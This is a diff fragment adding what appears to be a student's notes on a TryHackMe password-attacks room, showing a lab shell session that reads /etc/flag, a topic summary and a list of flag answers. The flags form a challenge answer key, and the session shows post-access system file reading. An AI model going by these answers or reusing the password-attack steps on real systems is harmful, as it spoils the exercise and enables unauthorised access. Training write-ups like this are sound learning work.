+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+61 packages can be updated.
+8 updates are security updates.
+
+Last login: Tue Nov 16 09:49:44 2021 from 10.8.232.37
+burgess@ip-10-10-163-182:~$ cat /etc/flag
+THM{a97a26e86d09388bbea148f4b870277d}
+burgess@ip-10-10-163-182:~$
+```
+### Summary
+This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including:
+Default, weak, leaked combined wordlists
+Password profiling
+Offline password attacks
+Online password attacks
+Hope you enjoyed the room and keep learning!
+
+## Flags / Answers
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/964652939b29903c091e3c03f867aaf0.png)
+- ***THM{d0abe799f25738ad739c20301aed357b}***
+- ***THM{33c5d4954da881814420f3ba39772644}***
+- ***THM{f8e3750cc0ccbb863f2706a3b2933227}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png)
+- ***THM{a97a26e86d09388bbea148f4b870277d}***
+
+## Notes / Lessons Learned
+[[Weaponization]]
+
